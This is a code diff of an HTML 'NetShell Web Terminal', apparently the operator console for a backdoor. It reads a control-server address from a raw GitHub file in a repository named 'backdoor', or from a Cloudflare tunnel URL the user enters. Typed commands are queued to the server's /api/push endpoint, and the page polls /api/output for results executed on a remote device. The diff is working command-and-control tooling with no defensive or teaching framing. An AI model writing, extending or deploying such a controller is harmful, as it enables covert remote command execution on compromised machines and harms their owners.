@@ -4,155 +4,214 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NetShell Web Terminal</title>
-    <!-- Xterm.js CSS -->
+    <!-- Include Xterm.js CSS CDN for authentic terminal look & feel -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" />
     <style>
-        body, html {
+        body {
+            background-color: #121212;
+            color: #f0f0f0;
+            font-family: Menlo, Monaco, "Courier New", Courier, monospace;
             margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000000;
-            overflow: hidden;
-            font-family: monospace;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            box-sizing: border-box;
+        }
+        /* Top Right Font Controls */
+        .controls {
+            position: fixed;
+            top: 15px;
+            right: 20px;
+            z-index: 1000;
+            background: rgba(30, 30, 30, 0.85);
+            padding: 5px 10px;
+            border-radius: 4px;
+            border: 1px solid #333;
+            backdrop-filter: blur(4px);
+        }
+        .controls button {
+            background: #2d2d2d;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 4px 10px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+        .controls button:hover {
+            background: #3c3c3c;
+        }
+        .controls span {
+            margin: 0 6px;
+            font-size: 12px;
+            color: #888;
+        }
+        #status-bar {
+            margin-bottom: 10px;
+            font-size: 13px;
+            color: #888;
         }
         #terminal-container {
-            width: 100%;
-            height: 100%;
-            padding: 10px;
-            box-sizing: border-box;
+            flex-grow: 1;
+            background-color: #000000;
+            border: 1px solid #2b2b2b;
+            border-radius: 6px;
+            padding: 12px;
+            overflow: hidden; /* Xterm manages its own scrolling viewport */
+        }
+        .input-line {
+            display: flex;
+            margin-top: 10px;
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 8px 12px;
+            align-items: center;
+        }
+        .prompt {
+            color: #4ec9b0;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+        #command-input {
+            flex-grow: 1;
+            background: transparent;
+            border: none;
+            color: #d4d4d4;
+            font-family: inherit;
+            font-size: 14px;
+            outline: none;
         }
     </style>
 </head>
 <body>
 
+    <!-- Top Right Font Controls -->
+    <div class="controls">
+        <span>Font</span>
+        <button onclick="adjustFontSize(-1)">-</button>
+        <button onclick="adjustFontSize(1)">+</button>
+    </div>
+
+    <div id="status-bar">Initializing NetShell Bridge...</div>
+    
+    <!-- Xterm Viewport Wrapper -->
     <div id="terminal-container"></div>
 
-    <!-- Xterm.js Core & Fit Addon -->
+    <div class="input-line">
+        <span class="prompt">$</span>
+        <input type="text" id="command-input" placeholder="Type a command and press Enter..." autofocus autocomplete="off">
+    </div>
+
+    <!-- Include Xterm.js Core Library CDN -->
     <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
-
     <script>
-        // 1. Prompt user for the active Cloudflare Tunnel URL
-        let serverUrl = prompt("Enter your Cloudflare Tunnel URL (e.g., https://xxx.trycloudflare.com):");
-        if (serverUrl) {
-            serverUrl = serverUrl.trim().replace(/\/$/, ""); // Remove trailing slash
-        }
+        const GIST_URL = "https://raw.githubusercontent.com/Yehia213/backdoor/main/api.txt";
+        let BASE_URL = "";
+        
+        const statusBar = document.getElementById('status-bar');
+        const commandInput = document.getElementById('command-input');
 
-        // 2. Initialize Xterm.js Terminal
+        // Initialize genuine Xterm instance
         const term = new Terminal({
             cursorBlink: true,
             theme: {
                 background: '#000000',
-                foreground: '#00FF00',
-                cursor: '#00FF00',
-                selectionBackground: 'rgba(0, 255, 0, 0.3)'
+                foreground: '#f0f0f0',
+                cursor: '#4ec9b0',
+                selectionBackground: 'rgba(78, 201, 176, 0.3)'
             },
-            fontFamily: 'Consolas, "Courier New", monospace',
-            fontSize: 14
+            fontSize: 14,
+            fontFamily: 'Menlo, Monaco, "Courier New", Courier, monospace'
         });
 
-        const fitAddon = new FitAddon.FitAddon();
-        term.loadAddon(fitAddon);
+        term.open(document.getElementById('terminal-container'));
 
-        const container = document.getElementById('terminal-container');
-        term.open(container);
-        fitAddon.fit();
-
-        window.addEventListener('resize', () => fitAddon.fit());
-
-        if (!serverUrl) {
-            term.writeln("\x1b[31m[!] Error: No server URL provided. Refresh page to try again.\x1b[0m");
-        } else {
-            term.writeln(`\x1b[32mNetShell Web v1.0 - Connected to: ${serverUrl}\x1b[0m`);
-            term.writeln("Type commands below. They will be queued and executed on the device.\r\n");
-            term.write("$ ");
+        let currentFontSize = 14;
+        function adjustFontSize(delta) {
+            currentFontSize += delta;
+            if (currentFontSize < 10) currentFontSize = 10;
+            if (currentFontSize > 28) currentFontSize = 28;
+            term.options.fontSize = currentFontSize;
         }
 
-        let currentInput = "";
-
-        // 3. Handle Keyboard Input (SSH-like interactive feel)
-        term.onKey(({ key, domEvent }) => {
-            if (!serverUrl) return;
-
-            const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;
-
-            if (domEvent.keyCode === 13) { // Enter key
-                term.writeln('');
-                const cmd = currentInput.trim();
-                currentInput = "";
-
-                if (cmd.length > 0) {
-                    executeRemoteCommand(serverUrl, cmd);
-                } else {
-                    term.write("$ ");
-                }
-            } else if (domEvent.keyCode === 8) { // Backspace
-                if (currentInput.length > 0) {
-                    currentInput = currentInput.slice(0, -1);
-                    term.write('\b \b');
-                }
-            } else if (printable) {
-                currentInput += key;
-                term.write(key);
-            }
-        });
-
-        // 4. API Communication Loop (Push & Poll Result)
-        async function executeRemoteCommand(baseUrl, command) {
+        async function initServerConnection() {
+            statusBar.textContent = "Fetching active server link from GitHub...";
             try {
-                term.writeln("\x1b[90m[Sending command to queue...]\x1b[0m");
-                
-                // Step A: Push command to server
-                let pushRes = await fetch(`${baseUrl}/api/push`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ command: command })
-                });
-
-                if (!pushRes.ok) {
-                    term.writeln(`\x1b[31m[!] Failed to push command (HTTP ${pushRes.status})\x1b[0m\n$ `);
-                    return;
-                }
-
-                term.writeln("\x1b[90m[Waiting for device execution...]\x1b[0m");
-
-                // Step B: Poll for output until it's populated (timeout after 20s)
-                let attempts = 0;
-                let outputFound = false;
-
-                while (attempts < 20 && !outputFound) {
-                    await new Promise(r => setTimeout(r, 1000)); // wait 1s per poll
-                    
-                    try {
-                        let outRes = await fetch(`${baseUrl}/api/output`);
-                        let outJson = await outRes.json();
-
-                        if (outJson.result !== null && outJson.result !== undefined) {
-                            outputFound = true;
-                            // Clean line breaks for proper terminal rendering
-                            let formattedOutput = outJson.result.replace(/\n/g, '\r\n');
-                            term.write(formattedOutput);
-                            if (!formattedOutput.endsWith('\r\n')) {
-                                term.writeln('');
-                            }
-                        }
-                    } catch (err) {
-                        // Network jitter during polling can be retried
+                let response = await fetch(GIST_URL);
+                if (response.ok) {
+                    let text = await response.text();
+                    BASE_URL = text.trim().replace(/\/$/, '');
+                    if (BASE_URL.startsWith('http')) {
+                        statusBar.textContent = `Connected to: ${BASE_URL}`;
+                        term.writeln("\x1b[32m[+] Successfully linked via GitHub api.txt\x1b[0m");
+                        startPollingOutput();
+                        return;
                     }
-                    attempts++;
                 }
-
-                if (!outputFound) {
-                    term.writeln("\x1b[33m[!] Timeout: Device did not respond or poll output was null.\x1b[0m");
-                }
-
-            } catch (error) {
-                term.writeln(`\x1b[31m[!] Network Error: ${error.message}\x1b[0m`);
+            } catch (e) {
+                console.warn("Auto-fetch from GitHub failed:", e);
             }
 
-            term.write("$ ");
+            // Fallback: ask user via prompt if auto-fetch fails
+            let manualUrl = prompt("Failed to auto-fetch server URL from GitHub. Please enter your active Cloudflare tunnel URL:");
+            if (manualUrl && manualUrl.trim().startsWith('http')) {
+                BASE_URL = manualUrl.trim().replace(/\/$/, '');
+                statusBar.textContent = `Connected manually to: ${BASE_URL}`;
+                term.writeln("\x1b[32m[+] Connected via manual input\x1b[0m");
+                startPollingOutput();
+            } else {
+                statusBar.textContent = "Error: No valid server URL provided.";
+                term.writeln("\x1b[31m[!] Connection aborted. Refresh to try again.\x1b[0m");
+            }
         }
+
+        // Send command on Enter
+        commandInput.addEventListener('keypress', async function (e) {
+            if (e.key === 'Enter' && BASE_URL) {
+                let cmd = commandInput.value.trim();
+                if (!cmd) return;
+                
+                commandInput.value = '';
+                term.writeln(`\x1b[36m$ ${cmd}\x1b[0m`);
+
+                try {
+                    await fetch(`${BASE_URL}/api/push`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ command: cmd })
+                    });
+                } catch (err) {
+                    term.writeln(`\x1b[31m[!] Error pushing command to server.\x1b[0m`);
+                }
+            }
+        });
+
+        // Poll for command outputs from the server
+        function startPollingOutput() {
+            setInterval(async () => {
+                if (!BASE_URL) return;
+                try {
+                    let res = await fetch(`${BASE_URL}/api/output`);
+                    if (res.ok) {
+                        let data = await res.json();
+                        if (data.result && data.result !== window.lastOutput) {
+                            window.lastOutput = data.result;
+                            // Clean up line breaks for proper xterm carriage rendering
+                            let formattedOutput = data.result.replace(/\n/g, '\r\n');
+                            term.writeln(formattedOutput);
+                        }
+                    }
+                } catch (e) {
+                    // Silent polling error retry
+                }
+            }, 2000);
+        }
+
+        // Run initialization on page load
+        initServerConnection();
     </script>
 </body>
 </html>
